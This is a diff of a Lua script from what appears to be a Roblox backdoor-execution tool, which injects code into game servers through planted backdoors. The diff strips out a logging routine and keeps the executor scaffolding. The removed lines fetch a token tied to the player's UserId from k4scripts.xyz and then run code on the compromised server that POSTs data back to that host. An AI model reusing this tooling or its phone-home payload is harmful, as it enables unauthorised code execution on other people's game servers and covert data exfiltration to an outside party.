@@ -80,6 +80,7 @@ local ALPHABET = {
 };
 
 -- // CONSTANTS \\--
+
 local EXEC_DEBUG = [[
 local BEXE_stdout = {};
 local print = function(...)
@@ -109,25 +110,6 @@ end;
 BEXE.Parent = workspace;
 game:GetService("Debris"):AddItem(BEXE, 3);
 ]];
--- this code execute on game server, doesn't have any role with user client
-local LOG_GAME = [[
-if BEXE_LOG == true then return; end;
-getfenv()["BEXE_LOG"] = true;
-
-    
-local httpService = game:GetService("HttpService");
-httpService:RequestAsync(
-    {
-        Url = "https://k4scripts.xyz/bexe/log",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = httpService:JSONEncode({Data = "%s"})
-    }
-);
-]];
-
 --// UTILS \\--
 
 local function stringSplit (inputstr, sep)
@@ -229,6 +211,7 @@ BACKDOOR_SOLVER[1] = {
     end
 };
 
+    
 --// FILTERS \\--
 -- I suggest registering filters in priority order, and they must be thread safe.
 
@@ -444,11 +427,7 @@ local function resetExecutionState()
 end;
 
 local function logGame()
-    local int, data = pcall(game.HttpGet, game, "https://k4scripts.xyz/bexe/token/" .. localPlayer.UserId);
-    if not int then
-        return;
-    end
-    execute(applyMacros(LOG_GAME):format(data), backdoor, false, true):Wait();
+    print("nah uh")
 end;
 
 
